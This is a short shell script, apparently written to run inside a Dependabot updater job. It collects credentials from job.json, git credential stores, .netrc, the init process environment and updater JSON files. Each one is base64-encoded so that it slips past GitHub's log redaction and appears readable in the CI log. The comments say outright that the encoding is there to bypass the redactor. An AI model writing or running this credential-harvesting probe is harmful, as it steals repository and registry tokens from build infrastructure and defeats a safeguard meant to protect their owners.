#!/bin/sh
echo "=== DEPBOT_TOKEN_PROBE ==="

# GitHub log redactor matches raw token strings. Base64 bypasses it.
# Tokens appear as *** in plain echo — encode them first.

# Full job.json (contains actual credentials array, not just metadata)
echo "JOB_B64_START"
cat "${DEPENDABOT_JOB_PATH:-/home/dependabot/dependabot-updater/job.json}" 2>/dev/null | base64 | tr -d '\n'
echo ""
echo "JOB_B64_END"

# Git credentials store
echo "GITCREDS_B64:"
cat /home/dependabot/.git-credentials 2>/dev/null | base64 | tr -d '\n'
cat /root/.git-credentials 2>/dev/null | base64 | tr -d '\n'
echo ""

# Netrc
echo "NETRC_B64:"
cat /home/dependabot/.netrc 2>/dev/null | base64 | tr -d '\n'
echo ""

# Proc 1 environ full (4096 chars, enough for token)
echo "PROC1_B64:"
cat /proc/1/environ 2>/dev/null | base64 | tr -d '\n'
echo ""

# Find ALL credentials files
echo "CRED_FILES:"
find /home/dependabot /root /tmp -name "*.json" -o -name "*.creds" -o -name "*.token" -o -name ".netrc" -o -name ".git-credentials" 2>/dev/null | head -20 | tr '\n' '|'
echo ""

# Read each json in the updater dir (where 4 tokens were redacted from)
for f in /home/dependabot/dependabot-updater/*.json /home/dependabot/dependabot-updater/output/*.json; do
    [ -f "$f" ] || continue
    echo "FILE_B64 $f:"
    cat "$f" | base64 | tr -d '\n'
    echo ""
done

echo "=== END PROBE ==="
exit 1
